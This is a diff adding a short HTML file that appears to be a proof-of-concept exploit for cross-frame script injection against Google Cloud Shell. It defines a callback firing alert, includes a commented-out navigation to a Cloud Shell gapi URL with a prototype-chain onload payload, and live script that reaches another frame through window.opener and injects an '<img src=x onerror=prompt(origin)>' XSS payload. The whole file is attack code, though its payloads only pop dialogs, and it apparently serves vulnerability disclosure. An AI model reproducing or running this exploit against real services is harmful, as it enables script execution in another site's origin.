@@ -1,0 +1,15 @@
+<html>
+<body>
+    
+        <script>function CSH_ISOLATED_GAPI_ONLOAD1670442745260(){alert(0);}</script>
+
+   <!-- <script>window.frames.location="https://shell.cloud.google.com/blank/gapi?onload=CSH_ISOLATED_GAPI_ONLOAD1670444813056.prototype.__proto__.cloudshell.ownerDocument.defaultView.alert";</script>
+   <script>window.frames.open("about:blank",);</script> -->
+   <script>
+      const myWindow = window.open("", "", "width=300,height=300");
+      console.log(myWindow.opener.parent.window[2].document);
+      
+      myWindow.opener.parent.window[2].document.getElementById("select-component-container").innerHTML = "<img src=x onerror=prompt(origin)>";
+    </script>
+</body>
+    </html>
